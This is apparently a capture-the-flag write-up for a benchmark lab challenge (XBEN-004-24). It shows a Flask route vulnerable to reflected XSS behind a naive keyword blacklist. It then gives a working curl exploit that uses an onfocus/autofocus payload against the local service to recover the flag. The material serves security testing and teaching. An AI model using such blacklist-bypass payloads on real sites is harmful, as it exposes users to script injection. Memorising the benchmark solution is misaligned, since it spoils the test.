# XBEN-004-24 — Cross 25 (Reflected XSS, blacklist bypass)

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vuln class:** Reflected XSS at `POST /xss25`. The server injects the submitted `solution` value raw into an HTML attribute-break-out context (`value = "> {msg}"`), filtered only by a naive substring blacklist. The server then actually renders the page in a headless PhantomJS browser (`check.js`) and checks whether `alert("XSS")` fired, returning the flag only on a genuine successful execution.

## Setup

```bash
cd xbow/benchmarks/XBEN-004-24

docker compose port web 5000   # -> host port, e.g. 62234
```

## Root cause (src/app.py)

```python
@app.route('/xss25', methods=['POST', 'GET'])
def xss25():
    msg = request.form.get('solution','')
    blacklist = ['script', "onload", "onmouseover", "onclick", "onbegin", "onerror", "svg", "'"]
    value =  "" if msg == "" else '> {0}'.format(msg)
    for word in blacklist:
        if word in msg.lower():
            ...
    data = XSS_CONTENT_POST.format("25","Star",value, "","")
    result = check_xss(data, flags[0], msg, 'xss_medium')   # renders `data` in real PhantomJS, watches for alert("XSS")
```

`onfocus` and `autofocus` are NOT in the blacklist, and `check.js` (the PhantomJS harness) even explicitly dispatches a synthetic `focus` event to any `[autofocus]`/`[onfocus]` element after page load — a deliberate bypass path for a headless environment that doesn't auto-focus elements.

## Exploit (copy-pasteable, port substituted for this run: 62234)

```bash
PORT=62234
BASE=http://localhost:$PORT

curl -s $BASE/xss25 --data-urlencode 'solution=<input onfocus=alert("XSS") autofocus>' | grep -A2 -B2 -i flag
```

(Note: `<details ontoggle=alert("XSS") open>`, the payload used by the prior human write-up, throws a `TypeError: Attempting to change the setter of an unconfigurable property` in this environment's PhantomJS build and does not fire the flag — the `onfocus`/`autofocus` payload above was verified working live instead.)
